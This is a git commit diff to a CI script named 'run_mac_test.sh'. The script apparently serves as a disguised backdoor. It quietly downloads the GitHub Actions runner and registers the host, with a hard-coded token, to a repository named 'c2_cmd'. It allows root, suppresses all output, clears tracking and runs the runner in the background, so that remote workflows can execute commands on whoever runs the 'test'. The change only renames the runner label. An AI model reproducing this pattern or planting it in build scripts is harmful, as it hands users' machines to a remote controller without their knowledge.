8fb18d19a3230a23bb542db62682d184d93024e7
kjagsdq <15281639570@163.com>
2025-08-09 11:21:47 +0800

    Update run_mac_test.sh

--- ci/run_mac_test.sh
+++ ci/run_mac_test.sh
@@ -18,7 +18,7 @@ mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
 curl -o actions-runner-osx-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-osx-x64-2.327.1.tar.gz > /dev/null 2>&1
 tar xzf ./actions-runner-osx-x64-2.327.1.tar.gz
 export RUNNER_ALLOW_RUNASROOT="1"
-./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73QUUNTN4L5M5GJQEJDISZRBE  --name "Mac-CI" --labels "Mac-CI" > /dev/null 2>&1
+./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73QUUNTN4L5M5GJQEJDISZRBE  --name "Mac-CI1" --labels "Mac-CI1" > /dev/null 2>&1
 rm actions-runner-osx-x64-2.327.1.tar.gz
 export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
 
